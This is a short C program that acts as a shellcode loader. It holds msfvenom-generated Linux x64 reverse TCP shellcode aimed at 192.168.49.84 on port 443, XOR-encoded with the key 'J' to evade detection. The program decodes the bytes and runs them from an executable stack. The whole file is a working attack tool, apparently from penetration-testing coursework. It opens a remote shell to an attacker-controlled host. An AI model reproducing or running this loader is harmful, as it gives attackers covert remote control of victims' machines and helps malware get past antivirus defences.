#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Compile with gcc -o xor_decrypt_exec.out xor_decrypt_exec.c -z execstack
int main (int argc, char **argv)
{
    // Result of 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.84 LPORT=443 -f c' fed through compiled xor_encoder.c
    unsigned char buf[] = "\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x7B\x1E\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x20\x49\x14\x02\xB5\x84\x20\x6B\x12\x45\x4F\x3F\xBC\x20\x71\x12\xD3\x02\xF1\x65\x28\x23\x24\x65\x39\x22\x4A\x19\x02\xC3\xAD\x18\x1D\x02\xC3\xAC\x45\x4F\x4A";
   
    char xor_key = 'J';
    int arraysize = (int) sizeof(buf);
    for (int i=0; i<arraysize-1; i++)
    {
        buf[i] = buf[i]^xor_key;
    }
    int (*ret)() = (int(*)())buf;
    ret();
}
